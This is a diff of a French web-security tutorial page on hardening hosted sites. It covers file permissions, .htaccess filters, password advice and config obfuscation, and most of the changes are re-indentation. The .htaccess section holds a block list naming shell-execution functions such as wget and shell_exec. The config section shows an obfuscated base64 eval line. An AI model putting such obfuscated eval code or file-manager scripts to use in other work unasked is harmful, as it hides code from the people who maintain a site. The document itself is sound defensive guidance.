@@ -12,6 +12,7 @@
 <link rel="alternate" type="application/rss+xml" href="https://silomia.github.io/en-rss.xml" title="Silomia English">
 <link rel="alternate" hreflang="fr" href="https://silomia.github.io/internet-se-proteger-des-pirates-et-hackers.html">
 <link rel="alternate" hreflang="en" href="https://silomia.github.io/en-internet-secure-protect-from-hacker-attacks.html">
+<link rel="canonical" href="https://silomia.gitlab.io/internet-se-proteger-des-pirates-et-hackers.html">
 <link rel="preload" href="css/styles.min.css" as="style">
 <link rel="preload" href="js/script.min.js" as="script">
 <link rel="preload" href="fonts/silomia-inter-light.woff2" as="font" type="font/woff2" crossorigin="anonymous">
@@ -113,7 +114,7 @@
 </tr>
 </tbody>
 </table></p>
-<a id="intro"></a><hr><br>
+						<a id="intro"></a><hr><br>
 						<header>
 							<h2>Introduction</h2>
 						</header>
@@ -126,13 +127,13 @@
 						<p>Donc, nous allons essayer de nous prémunir contre ces attaques automatiques. Ces conseils ne concernent que les sites web utilisant un CMS, blog ou e-commerce, etc. programmés par des informaticiens ou par vous.</p>
 						<p><strong class="vert">CONSEIL NUMÉRO 1&nbsp;:</strong> votre CMS, blog ou e-commerce doit être à jour. Vous suivrez les mises à jour de sécurité et les installerez sans attendre.</p>
 						<p><strong class="vert">CONSEIL NUMÉRO 2&nbsp;: LES RÈGLES LES PLUS IMPORTANTES</strong> <br>
-Comme ce tutoriel est long, voici les règles qu'il faut appliquer en priorité. Vous pourrez inclure les autres plus tard.<br>
-<strong>1-</strong> Attribuez par FTP aux fichiers les droits chmod 404 et aux dossiers les droits chmod 505. <a href="#chmod">Voir l'article ci-dessous.</a> <strong>C'est, sans conteste, la règle la plus efficace et indispensable.</strong></p>
+						Comme ce tutoriel est long, voici les règles qu'il faut appliquer en priorité. Vous pourrez inclure les autres plus tard.<br>
+						<strong>1-</strong> Attribuez par FTP aux fichiers les droits chmod 404 et aux dossiers les droits chmod 505. <a href="#chmod">Voir l'article ci-dessous.</a> <strong>C'est, sans conteste, la règle la plus efficace et indispensable.</strong></p>
 						<p><strong>2-</strong> Le tableau de bord ou l'interface d'administration de votre blog, CMS ou e-commerce est protégé par un identifiant et un mot de passe complexe. Toutefois, sa résistance à l'agression dépend des choix techniques (et des failles) du programmeur. Contre cela, ajoutez une deuxième protection par <a href="#dossierpasse">le mot de passe .htaccess.</a> Si un pirate arrive à contourner la première sécurité, il va se heurter à un deuxième mur. <strong>Cette double défense est une armure contre les attaques automatiques.</strong></p>
 						<p><strong>3-</strong> Règles de filtrage par htaccess. Permet d'arrêter de nombreuses attaques avant de toucher votre site web. <a href="#htaccess">Voir l'article ici.</a> Leurs efficacités seront excellentes mais elles se basent sur <strong>les comportements des hackers et des techniques qui évoluent</strong> avec les années. Ces protections ne seront jamais absolues.</p>
 						<p>Si vous pouvez combiner les trois premières règles, ou au minimum seulement les deux premières, <strong class="vert"> vous érigerez une véritable forteresse&nbsp;!</strong></p>
 						<p><strong>4-</strong> Règles de sauvegarde et de restauration de votre site web. D'abord, vérifiez quels fichiers le pirate a ajouté ou modifié en installant <a href="#fichmodif">ce script </a>. Ensuite, êtes-vous capable d'effacer complètement votre site web pour supprimer toutes les traces du pirate et de tout réactiver en 30 minutes&nbsp;? Voici comment. <a href="internet-sauvegarde-backup-restauration-web-sql.html">Lire l'article ici</a>.</p>
-<a id="chmod"></a><hr><br>
+						<a id="chmod"></a><hr><br>
 						<header>
 							<h2>Les droits d'écriture, de lecture et d'exécution.</h2>
 						</header>
@@ -140,14 +141,14 @@ Comme ce tutoriel est long, voici les règles qu'il faut appliquer en priorité.
 						<p>Plus d'infos ici&nbsp;: <a href="https://fr.wikipedia.org/wiki/Chmod">Description du CHMOD et de la signification des numéros.</a></p>
 						<p>Attention, ces règles peuvent fonctionner pour certains hébergeurs et pas chez d'autres. Faites un petit essai, cela en vaut vraiment la peine.</p>
 						<p>On a l'habitude de dire qu'on doit attribuer par FTP les droits 644 à un fichier et 755 à un dossier.<br>
-En fait, certains hébergeurs (mais pas tous) ne semblent pas utiliser de <em>groupe</em>. Donc, on pourrait très bien utiliser les droits 604 pour un fichier et 705 pour un dossier. Si un pirate pénètre le système avec un droit de <em>groupe</em>, il n'aura accès à rien, ni en lecture ni en écriture.</p>
+						En fait, certains hébergeurs (mais pas tous) ne semblent pas utiliser de <em>groupe</em>. Donc, on pourrait très bien utiliser les droits 604 pour un fichier et 705 pour un dossier. Si un pirate pénètre le système avec un droit de <em>groupe</em>, il n'aura accès à rien, ni en lecture ni en écriture.</p>
 						<p>On peut aller plus loin. Protégeons les parties sensibles de votre CMS, blog ou e-commerce, comme le fichier config.php et .htaccess en lui donnant les droits 404 (ou 444). Personne ne pourra le modifier, même pas vous (c'est faux dans l'absolu si votre site a un gros trou de sécurité, mais imparable contre une attaque automatique). Vous ne pourrez le faire que par FTP quand vous aurez vraiment besoin de le modifier.</p>
 						<p><strong>Voilà comment je protège mon site&nbsp;:</strong><br>
-Tous les fichiers ont les droits 404 (ou 444).<br>
-Tous les dossiers ont les droits 505 (ou 555).<br>
-Si un fichier ou un dossier nécessitent des droits d'écriture par le serveur mettez 604 pour le fichier et 705 pour le dossier. Inutile de faire le fameux 777 (tous les droits à tout le monde) qui est un danger public, une provocation au piratage, car vous annoncez que votre maison est grande ouverte, sans porte ni fenêtre, tout le monde peut se servir.<br>
-Les fichiers config et htaccess ont des droits 404 (ou 444)<br>
-Le dossier “www” ou “public_html” <strong>doit</strong> être en chmod 705 ou 755 selon votre hébergeur, ne le changez jamais.</p>
+						Tous les fichiers ont les droits 404 (ou 444).<br>
+						Tous les dossiers ont les droits 505 (ou 555).<br>
+						Si un fichier ou un dossier nécessitent des droits d'écriture par le serveur mettez 604 pour le fichier et 705 pour le dossier. Inutile de faire le fameux 777 (tous les droits à tout le monde) qui est un danger public, une provocation au piratage, car vous annoncez que votre maison est grande ouverte, sans porte ni fenêtre, tout le monde peut se servir.<br>
+						Les fichiers config et htaccess ont des droits 404 (ou 444)<br>
+						Le dossier “www” ou “public_html” <strong>doit</strong> être en chmod 705 ou 755 selon votre hébergeur, ne le changez jamais.</p>
 						<p><strong>Avantage&nbsp;:</strong> personne ne peut modifier vos fichiers. <strong>Inconvénient&nbsp;:</strong> il faut changer les droits en écriture (644 et 755) si vous faites une mise à jour de votre CMS, blog ou e-commerce et remettre les bons droits 404 (ou 444) et 505 (ou 555) après. Cela prend 10 min., mais ça en vaut la peine. Si votre hébergeur ne vous permet pas de faire cela, déménagez chez un autre.</p>
 						<p><strong>Pourquoi est-ce si important&nbsp;?</strong> Le pirate essaye d'installer un fichier sur votre site afin d'en prendre le contrôle (pour effacer le site, y placer des fichiers pour faire du phishing ou un script qui envoie du spam, etc.). Il cherche des trous de sécurité pour pouvoir enregistrer son fichier de prise de contrôle dans votre serveur. Si votre site web a un trou de sécurité, le pirate l'exploitera, mais comme votre site web n'a que des dossiers et fichiers interdits en écriture, il ne pourra rien enregistrer. Son attaque ne marchera pas. <strong>S'il n'y avait qu'une seule règle à appliquer ce serait celle-là, sans conteste la plus efficace et indispensable.</strong></p>
 						<p>Le plus simple est d'utiliser votre logiciel de FTP, d'afficher les informations relatives à un fichier ou un dossier et votre logiciel affiche l'option de modification des droits. Une autre méthode efficace, si vous avez de nombreux fichiers, est de se connecter en SSH (voir sa description plus bas). Sinon, voici un petit script PHP qui vous permettra de réaliser cette opération très simplement. Vous enregistrez ce fichier dans votre hébergement web, vous l'ouvrez depuis votre navigateur, entrez le chemin du dossier à traiter, et choisissez les réglages CHMOD pour tous les fichiers et dossiers inclus dans ce répertoire. Un rapport détaillé vous donnera les résultats. Une fois l'opération terminée, supprimez ce fichier pour éviter toute utilisation involontaire.</p>
@@ -237,11 +238,11 @@ Le dossier “www” ou “public_html” <strong>doit</strong> être en chmod 7
 <span style="color: #BC7A00">?&gt;</span>
 </pre></div>
 						<p>Il est possible d'accélérer le changement des droits par SSH en automatisant cette action. Votre hébergeur doit vous donner accès à une connexion SSH.<br>
-Avec un script qui fait du <a href="http://sourceforge.net/projects/shcmd/">pseudo-ssh en PHP</a>, mettez le fichier dans le dossier "www" ou "public_html" et commencez le travail.<br>
-Changer tous les droits par FTP de tous les fichiers et dossiers peut être long et fastidieux avec le risque d'en oublier. J'utilise les lignes de commandes ci-dessous pour changer les droits rapidement par SSH.</p>
+						Avec un script qui fait du <a href="http://sourceforge.net/projects/shcmd/">pseudo-ssh en PHP</a>, mettez le fichier dans le dossier "www" ou "public_html" et commencez le travail.<br>
+						Changer tous les droits par FTP de tous les fichiers et dossiers peut être long et fastidieux avec le risque d'en oublier. J'utilise les lignes de commandes ci-dessous pour changer les droits rapidement par SSH.</p>
 						<p>Connectez-vous en SSH à votre compte, puis placez-vous dans le dossier “www” (ou “public_html”) en entrant la commande cd www , et entrez les commandes suivantes en une seule ligne (après avoir modifié les noms des fichiers et dossiers selon les besoins)&nbsp;:<br>
-En mode SSH, mettez-vous dans le dossier "www" ou "public_html" avant de commencer.<br>
-On copie une ligne, on appuie sur la touche Entrée, et on copie une autre ligne, on appuie sur la touche Entrée, etc. après avoir modifié les noms des fichiers et dossiers selon les besoins.</p>
+						En mode SSH, mettez-vous dans le dossier "www" ou "public_html" avant de commencer.<br>
+						On copie une ligne, on appuie sur la touche Entrée, et on copie une autre ligne, on appuie sur la touche Entrée, etc. après avoir modifié les noms des fichiers et dossiers selon les besoins.</p>
 						<p>Tous les fichiers ont les droits 404 ou 444 (<em>droit de lecture, aucun droit d'écriture</em>)&nbsp;:</p>
 <span class="smallfont">Code&nbsp;:</span>
 <pre class="smallfont code">find . -type f -print0 | xargs -0 chmod 404</pre>
@@ -264,7 +265,7 @@ On copie une ligne, on appuie sur la touche Entrée, et on copie une autre ligne
 <span class="smallfont">Code&nbsp;:</span>
 <pre class="smallfont code">find /home/loginftp/www/forum -type d -name &quot;*upload*&quot; -print0 | xargs -0 chmod 705</pre>
 <p><a href="https://fr.wikipedia.org/wiki/Chmod">Un article sur la signification du CHMOD et la signification des numéros.</a></p>
-<a id="htaccess"></a><hr><br>
+						<a id="htaccess"></a><hr><br>
 						<header>
 							<h2>Le fichier .htaccess</h2>
 						</header>
@@ -308,7 +309,7 @@ On copie une ligne, on appuie sur la touche Entrée, et on copie une autre ligne
 <span style="color: #008000">RewriteCond</span> %{REQUEST_METHOD} ^(DELETE|PUT|PATCH) [NC,F]
 </pre></div>
 						<p><strong>5-</strong> On n'autorise que l'affichage de certains fichiers, et pas les autres. Le fichier index.php est le fichier par défaut. Si on affiche index.htm, ça ne marche pas. L'intérêt est d'interdire au pirate d'afficher sur son navigateur un fichier ou un format de fichier non autorisé. <strong class="vert">-= <u>TRÈS</u> <u>TRÈS</u> <u>TRÈS</u> EFFICACE MAIS À TESTER ET À ADAPTER À VOTRE INSTALLATION =-</strong><br>
-Attention: il faut tester ces interdictions et les adapter au besoin.</p>
+						Attention: il faut tester ces interdictions et les adapter au besoin.</p>
 <span class="smallfont">Code&nbsp;:</span>
 <!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### SEUL LE FICHIER index.php EST SERVI COMME PREMIER FICHIER PAR DÉFAUT. LES AUTRES SONT INTERDITS</span>
 <span style="color: #008000">DirectoryIndex</span> index.php
@@ -398,12 +399,12 @@ Attention: il faut tester ces interdictions et les adapter au besoin.</p>
 <span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)(wget|shell_exec|passthru|system|exec|popen|proc_open)(.*)$
 <span style="color: #008000">RewriteRule</span> (.*) [F]
 </pre></div>
-<p><strong>Ne mettez pas ces règles d'un coup.</strong><br>
-Copiez-en une, puis testez votre CMS, blog ou e-commerce en ajoutant, modifiant un article, ajoutez, effacez un utilisateur, accédez à votre interface d'administration et faites plusieurs choses. Si tout est OK, mettez une autre règle. En cas de problème, regardez l'URL appelée. Il y a peut-être un mot-clé qui est bloqué par le fichier .htaccess. Il faudra effacer ce mot-clé du fichier .htaccess. Vous l'avez compris, ce système filtre l'URL et regarde s'il est conforme à une utilisation normale. Donc, si vous avez un message d'erreur, trouvez le mot-clé qui bloque la requête.<br>
-Il faut adapter ces règles à votre cas, ce n'est pas du simple copier-coller.</p>
+						<p><strong>Ne mettez pas ces règles d'un coup.</strong><br>
+						Copiez-en une, puis testez votre CMS, blog ou e-commerce en ajoutant, modifiant un article, ajoutez, effacez un utilisateur, accédez à votre interface d'administration et faites plusieurs choses. Si tout est OK, mettez une autre règle. En cas de problème, regardez l'URL appelée. Il y a peut-être un mot-clé qui est bloqué par le fichier .htaccess. Il faudra effacer ce mot-clé du fichier .htaccess. Vous l'avez compris, ce système filtre l'URL et regarde s'il est conforme à une utilisation normale. Donc, si vous avez un message d'erreur, trouvez le mot-clé qui bloque la requête.<br>
+						Il faut adapter ces règles à votre cas, ce n'est pas du simple copier-coller.</p>
 						<p>Plus tard, si dans l'utilisation de votre CMS, blog ou e-commerce, vous voyez une erreur 403, alors il est probable qu'une règle du filtrage soit active.</p>
 						<p>Enfin, votre CMS, blog ou e-commerce utilise souvent le fichier .htaccess pour y mettre des règles de ré-écriture d'URL plus lisibles (appelé URL rewriting). Mettez les filtres anti-pirates en premier et les règles URL rewriting à la fin. En effet, les filtres s'appliquent du premier au dernier. Placer les filtres anti-pirates après les règles de ré-écriture d'URL de votre CMS, blog ou e-commerce n'apporterait aucun bénéfice (ce n'est pas vrai à 100%, mais il y a des raisons).</p>
-<a id="fichmodif"></a><hr><br>
+						<a id="fichmodif"></a><hr><br>
 						<header>
 							<h2>Avoir la liste des fichiers modifiés et ajoutés</h2>
 						</header>
@@ -411,8 +412,8 @@ Il faut adapter ces règles à votre cas, ce n'est pas du simple copier-coller.<
 						<p>Si vous avez été victime d'un piratage, il vous permettra de savoir quels fichiers ont été ajoutés et ceux qui ont été modifiés par le pirate avec la date et l'heure. Ainsi, en comparant la date de ces fichiers modifiés aux logs, vous saurez si la modification est normale ou pas et vous saurez quand et comment le pirate a frappé.</p>
 						<p>Il sert également à comprendre le comportement d'un script ou d'un CMS, blog, wiki et voir quels fichiers ont été manipulés par ce logiciel.</p>
 						<p>Copiez le code ci-dessous et créez un fichier texte que vous pourrez appeler par exemple&nbsp;: liste-modif.php<br>
-Mettez ce script dans votre hébergement dans le dossier “www” ou “public_html”, ouvrez-le avec votre navigateur web, donnez le nombre de jours représentant la période à vérifier, puis le nom du dossier à analyser. Le chemin de fichier doit se terminer par / comme par exemple&nbsp;: “/forum/” qui correspondra à “/home/votreloginftp/www/forum/”<br>
-Si vous voulez vérifier tout le contenu du dossier “www” ou “public_html”, cliquez uniquement sur le bouton “Vérifier Fichiers”.</p>
+						Mettez ce script dans votre hébergement dans le dossier “www” ou “public_html”, ouvrez-le avec votre navigateur web, donnez le nombre de jours représentant la période à vérifier, puis le nom du dossier à analyser. Le chemin de fichier doit se terminer par / comme par exemple&nbsp;: “/forum/” qui correspondra à “/home/votreloginftp/www/forum/”<br>
+						Si vous voulez vérifier tout le contenu du dossier “www” ou “public_html”, cliquez uniquement sur le bouton “Vérifier Fichiers”.</p>
 						<p>Attention, si vous avez beaucoup de fichiers et de répertoires, le listage peut prendre trop de temps et le script peut s'interrompre après 30s d'exécution. Si c'est le cas, essayez votre recherche répertoire par répertoire.</p>
 						<p>Ce script ne va donner la liste que des dossiers à partir du chemin “/home/votreloginftp/www/” ou “/home/votreloginftp/public_html/” de votre hébergement. Une fois l'opération terminée, supprimez ce fichier pour éviter toute utilisation involontaire.</p>
 						<p>Vous pouvez prendre ce fichier PHP ici&nbsp;: <a href="depot/modif.zip">modif.zip (2,1 Ko)</a></p>
@@ -493,14 +494,14 @@ Si vous voulez vérifier tout le contenu du dossier “www” ou “public_html�
 <span style="color: #BC7A00">?&gt;</span>
 </pre></div>
 
-<a id="gesfic"></a><hr><br>
+						<a id="gesfic"></a><hr><br>
 						<header>
 							<h2>Gestionnaire de fichiers pour gérer son espace web</h2>
 						</header>
 						<p>Ce gestionnaire de fichiers écrit en PHP permet de manipuler le contenu d'un espace web, comme vous le feriez par FTP. Il permet de créer, lire, effacer, compresser, décompresser, changer les droits, renommer les fichiers et dossiers. Son interface est simpliste mais efficace.</p>
 						<p>C'est avec ce genre de script que le pirate modifie votre site quand il parvient à exploiter une faille de sécurité pour réussir à envoyer son fichier dans votre hébergement.</p>
 						<p>Copiez le code ci-dessous et créez un fichier texte que vous pourrez appeler par exemple&nbsp;: gesfic.php<br>
-Mettez ce script dans votre hébergement dans le dossier “www” ou “public_html” ou ailleurs, et ouvrez-le avec votre navigateur web.</p>
+						Mettez ce script dans votre hébergement dans le dossier “www” ou “public_html” ou ailleurs, et ouvrez-le avec votre navigateur web.</p>
 						<p>Le gestionnaire donne accès en lecture et écriture à tout l'espace de votre hébergement. Une fois l'opération terminée, supprimez ce fichier pour éviter toute utilisation involontaire.</p>
 						<p>Vous pouvez prendre ce fichier PHP ici&nbsp;: <a href="depot/gesfic.zip">gesfic.zip (4,4 Ko)</a></p>
 <span class="smallfont">Code PHP&nbsp;:</span>
@@ -904,54 +905,54 @@ Mettez ce script dans votre hébergement dans le dossier “www” ou “public_
 <span style="color: #BC7A00">?&gt;</span>
 </pre></div>
 
-<a id="motpasse"></a><hr><br>
+						<a id="motpasse"></a><hr><br>
 						<header>
 							<h2>Les mots de passe</h2>
 						</header>
 						<p>Protégez vos mots de passe.<br>
-On peut essayer de pénétrer votre hébergement en devinant votre mot de passe FTP ou SQL. Si vous changez les mots de passe, respectez les règles suivantes&nbsp;:<br>
-<strong>1-</strong> un mot de passe doit avoir au minimum 12 caractères, plus c'est mieux.<br>
-<strong>2-</strong> il ne doit jamais être un mot qu'on trouve dans le dictionnaire d'aucune langue. Les logiciels pour cracker des mots de passe ont des dictionnaires de centaines de milliers de mots de toutes les langues et cherchent toutes les combinaisons. Cela prend entre quelques minutes à quelques petites heures pour cracker ces mots de passe très facilement.<br>
-<strong>3-</strong> Un bon mot de passe contient des lettres majuscules et minuscules, des chiffres et des caractères non alphanumériques (comme les ponctuations).<br>
-<strong>4-</strong> <strong>N'UTILISEZ JAMAIS LE MÊME MOT DE PASSE pour le FTP, base SQL, e-mail, interface d'administration du site web</strong>. Le pirate <strong>SAIT</strong> que s'il trouve votre mot de passe, il a de fortes chances que ce soit le même mot de passe ailleurs&nbsp;!!! Beaucoup d'hébergeurs proposent un mot de passe unique pour “simplifier” la gestion.</p>
+						On peut essayer de pénétrer votre hébergement en devinant votre mot de passe FTP ou SQL. Si vous changez les mots de passe, respectez les règles suivantes&nbsp;:<br>
+						<strong>1-</strong> un mot de passe doit avoir au minimum 12 caractères, plus c'est mieux.<br>
+						<strong>2-</strong> il ne doit jamais être un mot qu'on trouve dans le dictionnaire d'aucune langue. Les logiciels pour cracker des mots de passe ont des dictionnaires de centaines de milliers de mots de toutes les langues et cherchent toutes les combinaisons. Cela prend entre quelques minutes à quelques petites heures pour cracker ces mots de passe très facilement.<br>
+						<strong>3-</strong> Un bon mot de passe contient des lettres majuscules et minuscules, des chiffres et des caractères non alphanumériques (comme les ponctuations).<br>
+						<strong>4-</strong> <strong>N'UTILISEZ JAMAIS LE MÊME MOT DE PASSE pour le FTP, base SQL, e-mail, interface d'administration du site web</strong>. Le pirate <strong>SAIT</strong> que s'il trouve votre mot de passe, il a de fortes chances que ce soit le même mot de passe ailleurs&nbsp;!!! Beaucoup d'hébergeurs proposent un mot de passe unique pour “simplifier” la gestion.</p>
 						<p>Il existe des logiciels qui créent des mots de passe uniques et aléatoires et gèrent cela pour vous (regardez <a href="https://bitwarden.com">Bitwarden</a>, <a href="https://www.keepassx.org">KeepassX</a> et <a href="https://keepass.info">Keepass</a>, <a href="https://1password.com/fr/">1Password</a>, <a href="https://www.dashlane.com/fr">Dashlane</a>, <a href="https://www.lastpass.com/fr">LastPass</a>…). C'est ce qu'il y a de mieux car vous n'avez rien à mémoriser. <br>
 						Vous pouvez créer cette liste vous-même dans un fichier que vous protègerez par un mot de passe et copier-coller les données pour chaque formulaire de connexion. Pour simplifier cette tâche, vous pouvez aussi choisir de faire confiance à votre navigateur web qui enregistrera vos mots de passe uniques, synchronisera vos données entre vos appareils et remplira pour vous le champ du formulaire à chaque connexion avec le bon mot de passe. Pour générer ces mots de passe uniques, voyez par exemple ces sites web&nbsp;:<br>
 						<a href="https://www.motdepasse.xyz">https://www.motdepasse.xyz</a><br>
-<a href="https://fr.vpnmentor.com/tools/secure-password-generator/">https://fr.vpnmentor.com/tools/secure-password-generator/</a><br>
+						<a href="https://fr.vpnmentor.com/tools/secure-password-generator/">https://fr.vpnmentor.com/tools/secure-password-generator/</a><br>
 						<a href="https://www.comparitech.com/privacy-security-tools/password-strength-test/">https://www.comparitech.com/privacy-security-tools/password-strength-test/</a></p> 
 						<p> Ces sites web proposent des mots de passe phonétiques, créant des mots faciles à mémoriser&nbsp;:<br>
-<a href="https://www.dashlane.com/fr/features/password-generator">https://www.dashlane.com/fr/features/password-generator</a> (Dashlane)<br>
-<a href="https://www.lastpass.com/fr/password-generator">https://www.lastpass.com/fr/password-generator</a> (LastPass)<br>
-<a href="https://tools.arantius.com/password">https://tools.arantius.com/password</a></p>
+						<a href="https://www.dashlane.com/fr/features/password-generator">https://www.dashlane.com/fr/features/password-generator</a> (Dashlane)<br>
+						<a href="https://www.lastpass.com/fr/password-generator">https://www.lastpass.com/fr/password-generator</a> (LastPass)<br>
+						<a href="https://tools.arantius.com/password">https://tools.arantius.com/password</a></p>
 						<p>Pour être sûr qu'un mot de passe mémorisable ou phonétique n'existe dans aucune langue, tapez-le en partie ou en entier dans un moteur de recherche. S'il ne retourne aucun résultat, alors votre mot de passe n'est pas un mot du dictionnaire.</p>
-<a id="installsql"></a><hr><br>
+						<a id="installsql"></a><hr><br>
 						<header>
 							<h2>Installation d'une base SQL</h2>
 						</header>
 						<p>Lorsque vous installez votre CMS, blog ou e-commerce pour la première fois, il vous propose des réglages et paramètres par défaut que nous acceptons à chaque fois. En cas de faille, le pirate peut utiliser ces réglages et paramètres par défaut pour pénétrer votre base SQL et la modifier.</p>
 						<p>Voici quelques conseils pour éviter que cette forme d'attaque de type injection SQL soit possible. Il y a plusieurs formes d'injections SQL. La règle 3 du .htaccess en arrête une autre forme. Sinon, la vraie protection contre les injections SQL est une bonne programmation.</p>
 						<p><strong>1-</strong> Quand vous installez votre CMS, blog ou e-commerce, il vous donne comme login “admin” et vous demande d'entrer un mot de passe. Dans la mesure du possible, changez “admin” pour autre chose, un pseudo par exemple. Un pirate sait que le login par défaut est “admin” et lancera ses scripts uniquement sur le mot de passe. Mais si le login “admin” n'existe pas, il n'a aucune chance de pénétrer le système.<br>
-Il faut parfois faire cette modification dans phpMyadmin. Mais attention, il faut être sûr que cela ne cassera pas votre base. Posez la question sur le forum de l'éditeur de votre CMS, blog ou e-commerce pour savoir si c'est possible.</p>
+						Il faut parfois faire cette modification dans phpMyadmin. Mais attention, il faut être sûr que cela ne cassera pas votre base. Posez la question sur le forum de l'éditeur de votre CMS, blog ou e-commerce pour savoir si c'est possible.</p>
 						<p><strong>2-</strong> Le premier utilisateur est donc l'administrateur et il porte toujours le numéro (ou ID) 1. Dans le cas où le login n'est pas “admin”, certains scripts peuvent essayer d'avoir le mot de passe de l'utilisateur numéro 1 qui est, dans 99,99% des cas, l'administrateur. Dans la mesure du possible, effacez l'utilisateur numéro 1 sur la liste et soyez l'administrateur portant le numéro 2 ou 15 ou 250.<br>
-Il faut parfois faire cette modification dans phpMyadmin. Mais attention, il faut être sûr que cela ne cassera pas votre base. Posez la question sur le forum de l'éditeur de votre CMS, blog ou e-commerce pour savoir si c'est possible.</p>
+						Il faut parfois faire cette modification dans phpMyadmin. Mais attention, il faut être sûr que cela ne cassera pas votre base. Posez la question sur le forum de l'éditeur de votre CMS, blog ou e-commerce pour savoir si c'est possible.</p>
 						<p><strong>3-</strong> Lors de l'installation, votre CMS, blog ou e-commerce vous demande de choisir un préfixe pour le nom des tables. On accepte toujours le préfixe par défaut comme wp_ pour Wordpress, g2_ pour Gallery2, dc_ pour DotClear, phpbb_ pour phpBB, etc. Le pirate peut chercher la table avec la liste des utilisateurs et leurs mots de passe. Si, comme tout le monde, vous n'avez pas changé le préfixe, il lui sera facile de trouver la table. Donc, changez le préfixe de vos tables SQL pour plus de sécurité. Vous pouvez le faire après installation. Il faut parfois faire cette modification dans phpMyadmin. Mais attention, il faut être sûr que cela ne cassera pas votre base. Posez la question sur le forum de l'éditeur de votre CMS, blog ou e-commerce pour savoir si c'est possible.<br>
-Par exemple, avec Wordpress en cas de changement de préfixe après installation, il faut aussi changer 2 entrées dans la base de données en plus du fichier wp-config.php, voyez leurs forums pour savoir comment faire.</p>
+						Par exemple, avec Wordpress en cas de changement de préfixe après installation, il faut aussi changer 2 entrées dans la base de données en plus du fichier wp-config.php, voyez leurs forums pour savoir comment faire.</p>
 						<p><strong>Mon conseil: <span style="color:#008080;">TOUJOURS MODIFIER LES PARAMÈTRES PAR DÉFAUT&nbsp;!</span></strong></p>
-<a id="nommage"></a><hr><br>
+						<a id="nommage"></a><hr><br>
 						<header>
 							<h2>Nommage de fichiers</h2>
 						</header>
 						<p>Pour éviter que les robots des pirates ne vous trouvent grâce à Google, changez certaines habitudes et notamment le nom et l'URL de certains fichiers.</p>
 						<p>1- N'appelez pas la page de votre formulaire de contact&nbsp;: mail.php ou contact.html. Appelez là autrement comme “courrier”, “missive”, etc. Les robots spammeurs auront plus de mal à trouver un formulaire de contact à pirater pour envoyer des spams grâce à une faille de votre script d'envoi de mail.<br>
-Faites la même chose avec d'autres fichiers&nbsp;: pas de login.php, admin.php, download.php (on va chercher la faille pour télécharger un fichier hors de son répertoire), etc. En règle général, évitez ces mots anglais trop répandus.</p>
+						Faites la même chose avec d'autres fichiers&nbsp;: pas de login.php, admin.php, download.php (on va chercher la faille pour télécharger un fichier hors de son répertoire), etc. En règle général, évitez ces mots anglais trop répandus.</p>
 						<p>2- Les spammeurs ne sont pas idiots. Changez aussi certains noms du formulaire. Dans les balises html INPUT, changez l'attribut NAME qui contient des mots comme “e-mail”, “mail”, “name” ou “subject” par leur équivalent en français (courriel, nom, sujet). Faites ce changement dans le formulaire HTML et dans votre script php ou cgi.</p>
 						<p>3- Évitez de donner le nom de votre CMS, blog ou e-commerce directement dans l'URL comme&nbsp;: www.domaine.tld/admin/ ou www.domaine.tld/login/ ou www.domaine.tld/blog/ ou www.domaine.tld/forum/ ou www.domaine.tld/shop/. Les spammeurs et piratent cherchent ces URL à cibler pour une attaque. Soyez plus original pour votre sécurité. Le mieux est d'éviter le mot anglais et de préférer son équivalent en français.</p>
-<a id="cryptconfig"></a><hr><br>
+						<a id="cryptconfig"></a><hr><br>
 						<header>
 							<h2>Crypter son fichier config.inc.php</h2>
 						</header>
 						<p>Malgré toutes les précautions, le pirate a pénétré votre site et cherche maintenant à connaitre les login et mot de passe de votre base MySQL pour la pirater, la vider et en prendre le contrôle. On peut lui compliquer la tâche en cryptant ces données sensibles. Le serveur web pourra lire ces informations facilement, mais elles ne seront pas lisibles directement par un &#339;il humain. <br>
-Pour un expert en PHP, cette protection ne dure que 2 minutes, cela lui fait du travail en plus, mais nous ne sommes pas là pour lui faciliter la tâche&nbsp;?</p>
+						Pour un expert en PHP, cette protection ne dure que 2 minutes, cela lui fait du travail en plus, mais nous ne sommes pas là pour lui faciliter la tâche&nbsp;?</p>
 						<p>Visitez ce site web et cryptez vos données. <br>
 <a href="http://www.phpencode.org">www.phpencode.org</a> ou <a href="http://www.mobilefish.com/services/php_obfuscator/php_obfuscator.php">www.mobilefish.com/services/php_obfuscator/php_obfuscator.php</a> ou cherchez un “PHP Obfuscator”.</p>
 						<p>Par exemple, mon fichier config.php contient ceci&nbsp;:</p>
@@ -965,8 +966,8 @@ Pour un expert en PHP, cette protection ne dure que 2 minutes, cela lui fait du 
 <span style="color: #BC7A00">?&gt;</span>
 </pre></div>
 						<p>Je copie la partie à encoder entre les balises &lt;?php et&nbsp;?&gt;<br>
-Je choisis l'encodage “PHP Extrastrength”. Ne cherchez pas un encodage plus élevé, j'ai parfois constaté des erreurs sur les serveurs web.<br>
-Je copie la longue ligne qui commence par eval(xxxx entre les balises &lt;? et&nbsp;?&gt; et le colle dans le fichier config.inc.php, ce qui donne&nbsp;:</p>
+						Je choisis l'encodage “PHP Extrastrength”. Ne cherchez pas un encodage plus élevé, j'ai parfois constaté des erreurs sur les serveurs web.<br>
+						Je copie la longue ligne qui commence par eval(xxxx entre les balises &lt;? et&nbsp;?&gt; et le colle dans le fichier config.inc.php, ce qui donne&nbsp;:</p>
 <span class="smallfont">Code PHP&nbsp;:</span>
 <!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
 <span style="color: #008000; font-weight: bold">eval</span>(<span style="color: #008000">gzuncompress</span>(<span style="color: #008000">gzinflate</span>(<span style="color: #008000">base64_decode</span>(<span style="color: #BA2121">&#39;AW4Akf942k3LTQqAIBQE4H3QHQZp5cYDRDeoRXSAMHyIkFo+K7p9f5t2w3wzSkmJ7hz6Fkw5u2AZUipVFpWZRqa0UwLQQLx5S7zOov40aE/ApyH6STP9dLsP7+LWOVoXfrZo5iMm85iP2dBTkKgv8oMsVg==&#39;</span>)))); 
@@ -974,28 +975,28 @@ Je copie la longue ligne qui commence par eval(xxxx entre les balises &lt;? et&n
 </pre></div>
 						<p>Ainsi, vous pouvez occulter toutes les informations sensibles.</p>
 						<p>Et attribuez par FTP les droits 404 ou 444 à votre fichier config.inc.php (ou équivalent) si c'est possible.</p>
-<a id="cryptmail"></a><hr><br>
